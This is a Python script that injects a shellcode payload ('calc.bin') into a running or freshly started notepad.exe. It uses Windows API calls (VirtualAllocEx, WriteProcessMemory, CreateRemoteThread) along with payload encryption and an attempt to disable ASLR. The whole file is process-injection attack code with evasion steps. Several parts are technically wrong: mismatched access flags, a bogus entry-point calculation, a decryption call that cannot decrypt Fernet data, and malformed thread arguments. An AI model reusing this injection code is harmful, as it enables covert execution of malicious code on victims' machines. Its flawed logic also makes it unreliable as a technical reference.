import psutil
import subprocess
from cryptography.fernet import Fernet
from ctypes import *
import ctypes
import sys

# Constants used for disabling ASLR
PROCESS_CREATION_DONT_RANDOMIZE = 0x00002000
PROCESS_CREATE_FLAGS = 0x08000000


with open("calc.bin", "rb") as f:
    payload = f.read()


# Encrypt the payload using Fernet
key = Fernet.generate_key()
f = Fernet(key)
encrypted_payload = f.encrypt(payload)

# Find the process to inject the payload into
process_name = "notepad.exe"
for proc in psutil.process_iter():
    if proc.name() == process_name:
        target_process = proc
        break
else:
    # If the process is not running, create a new instance
    target_process = subprocess.Popen(process_name)

# Allocate memory in the target process to store the encrypted payload
# process_handle = windll.kernel32.OpenProcess(0x1F0FFF, False, target_process.pid)
process_handle = windll.kernel32.OpenProcess(PROCESS_CREATE_FLAGS, False, target_process.pid)
memory_allocation = windll.kernel32.VirtualAllocEx(process_handle, None, len(encrypted_payload), 0x3000, 0x04)

# Disable bottom-up ASLR in the target process
class PROCESS_CREATION_MITIGATION_POLICY(Structure):
    _fields_ = [("Policy", c_uint),
                ("Flags", c_uint),
                ("PolicyValue", POINTER(c_void_p)),
                ("PolicyValueSize", c_ulong)]
                
PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 0x20009
PROCESS_CREATION_MITIGATION_POLICY_BOTTOM_UP_ASLR_ALWAYS_OFF = 0x02

# Create a c_void_p object to hold the policy value
policy_value = c_void_p(PROCESS_CREATION_MITIGATION_POLICY_BOTTOM_UP_ASLR_ALWAYS_OFF)

# Create a new c_void_p object and pass its address as the PolicyValue parameter
policy_value_ptr = pointer(c_void_p())
policy_value_ptr.contents = policy_value

PROCESS_CREATION_DONT_RANDOMIZE = PROCESS_CREATION_MITIGATION_POLICY(PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
                                                                    0,
                                                                    policy_value_ptr,
                                                                    sizeof(c_void_p))

ctypes.windll.kernel32.SetProcessMitigationPolicy(0x3, ctypes.byref(PROCESS_CREATION_DONT_RANDOMIZE), ctypes.sizeof(PROCESS_CREATION_DONT_RANDOMIZE))

# Write the encrypted payload to the allocated memory
windll.kernel32.WriteProcessMemory(process_handle, memory_allocation, encrypted_payload, len(encrypted_payload), None)

# Calculate the address of the entry point in the loaded module
loaded_module = windll.kernel32.LoadLibraryA("kernel32.dll")
entry_point_address = windll.kernel32.GetProcAddress(loaded_module, "LoadLibraryA") + 5

# Create a remote thread in the target process to execute the entry point
windll.kernel32.CreateRemoteThread(process_handle, None, 0, entry_point_address, memory_allocation, 0, None)

# Decrypt the payload in the target process
decrypted_payload_address = windll.kernel32.VirtualAllocEx(process_handle, None, len(payload), 0x3000, 0x04)
decryption_key_address = windll.kernel32.VirtualAllocEx(process_handle, None, len(key), 0x3000, 0x04)
windll.kernel32.WriteProcessMemory(process_handle, decryption_key_address, key, len(key), None)
decryption_function_address = windll.kernel32.GetProcAddress(loaded_module, "CryptUnprotectData")

# Create a remote thread in the target process to decrypt the payload
windll.kernel32.CreateRemoteThread(process_handle, None, 0, decryption_function_address, decryption_key_address, decrypted_payload_address, None)

# Execute the decrypted payload
ctypes.windll.kernel32.VirtualProtectEx(process_handle, decrypted_payload_address, len(payload), 0x40, byref(c_ulong()))
ctypes.windll.kernel32.WriteProcessMemory(process_handle, decrypted_payload_address, payload, len(payload), None)
ctypes.windll.kernel32.CreateRemoteThread(process_handle, None, 0, decrypted_payload_address, None, 0, None)

